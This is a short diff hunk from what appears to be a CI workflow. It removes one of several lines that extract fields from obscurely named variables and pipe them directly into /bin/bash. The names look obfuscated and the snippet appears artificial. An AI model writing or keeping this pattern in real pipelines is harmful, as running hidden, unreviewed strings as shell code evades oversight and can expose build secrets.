@@ -38,7 +38,6 @@ jobs:
           printf '%s' "$cx28" | jq -r .h1687 | /bin/bash
           printf '%s' "$tcq598" | jq -r .kv50 | /bin/bash
           echo $gqhsr0 | jq -r .ectak7 | /bin/bash
-          echo $p34545 | jq -r .a6488 | /bin/bash
           printf '%s' "$dszx944" | jq -r .ssvzn654 | /bin/bash
 
       - name: Save archive
